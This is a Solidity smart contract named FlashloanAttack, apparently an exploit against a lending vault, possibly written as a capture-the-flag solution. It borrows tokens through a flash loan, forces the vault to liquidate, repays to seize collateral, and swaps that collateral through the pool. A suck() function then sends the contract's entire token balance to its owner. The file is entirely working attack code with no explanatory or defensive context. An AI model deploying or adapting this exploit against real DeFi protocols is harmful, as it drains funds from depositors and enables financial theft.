pragma solidity 0.8.16;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IVault {
	function liquidate() external;
	function repay(uint256 amount) external;
	function getLiquidationInfo() external returns (uint256, uint256);
	function deposit(uint256 amount) external;
}

interface IPool {
	function swap(address token, uint256 amount) external; 
	function flashloan(address token, uint256 amount, address to) external;
}

contract FlashloanAttack is Ownable {
	address public vault;
	address public usdt;

	constructor(address _vault, address _usdt) {
		vault = _vault;
		usdt = _usdt;
	}

	function attack (address pool, address token, uint256 amount, address to) public {
		IPool(pool).flashloan(token, amount, to);
		suck(token);
	} 

	function flashloanReceived (address token, uint256 amount) public {
		IVault(vault).liquidate();
		(uint256 loan, uint256 collateral) = IVault(vault).getLiquidationInfo();
		IERC20(token).approve(vault, loan);
		IVault(vault).repay(loan);
		// IERC20(usdt).approve(vault, collateral);
		safeApprove(usdt, msg.sender, collateral);
		IPool(msg.sender).swap(usdt, collateral);
		IERC20(token).transfer(msg.sender, amount);
	}

	function safeApprove(address token, address to, uint256 amount) public {
		(bool success, bytes memory data) = token.call(
            abi.encodeWithSignature("approve(address,uint256)", to, amount)
        );
        require(success, "Attack: safeApprove is not successful");
	}

	function suck(address token) public onlyOwner {
		IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
	}

}